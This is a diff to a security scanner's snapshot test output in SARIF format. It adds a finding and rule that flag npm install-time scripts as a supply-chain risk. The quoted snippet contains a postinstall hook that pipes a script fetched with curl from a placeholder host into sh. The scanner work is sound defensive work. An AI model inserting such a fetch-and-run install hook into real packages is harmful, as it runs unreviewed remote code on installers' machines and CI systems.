@@ -692,8 +692,49 @@ expression: encoded
                   "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
+                  "endColumn": 71,
+                  "endLine": 7,
+                  "snippet": {
+                    "text": "    \"postinstall\": \"curl -s https://cdn.example.invalid/setup.sh | sh\""
+                  },
+                  "startColumn": 5,
+                  "startLine": 7
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Package declares an install-time script: `postinstall` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread."
+          },
+          "properties": {
+            "asi": "ASI04",
+            "confidence": "likely",
+            "cwe": "CWE-829",
+            "owasp": "A08:2021",
+            "severity": "medium"
+          },
+          "ruleId": "install-lifecycle-script",
+          "taxa": [
+            {
+              "id": "CWE-829",
+              "toolComponent": {
+                "name": "CWE"
+              }
+            }
+          ]
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
                   "startColumn": 1,
-                  "startLine": 11
+                  "startLine": 14
                 }
               }
             }
@@ -860,6 +901,22 @@ expression: encoded
               "name": "insecure-cookie",
               "shortDescription": {
                 "text": "Cookie set without its protective attributes"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "fullDescription": {
+                "text": "`postinstall` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread."
+              },
+              "help": {
+                "text": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve."
+              },
+              "id": "install-lifecycle-script",
+              "name": "install-lifecycle-script",
+              "shortDescription": {
+                "text": "Package declares an install-time script"
               }
             },
             {
